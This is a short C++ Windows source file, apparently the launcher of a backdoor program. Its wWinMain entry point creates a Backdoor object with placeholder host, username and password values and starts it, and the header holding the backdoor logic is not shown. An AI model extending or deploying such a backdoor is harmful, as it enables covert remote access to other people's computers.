#include <Windows.h>
#include <iostream>
#include <string>

#include "Backdoor.h"

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    PWSTR szCmdLine, int CmdShow)
{


    Backdoor b = Backdoor("host", "username", "password");
    b.start();


    return 0;
}
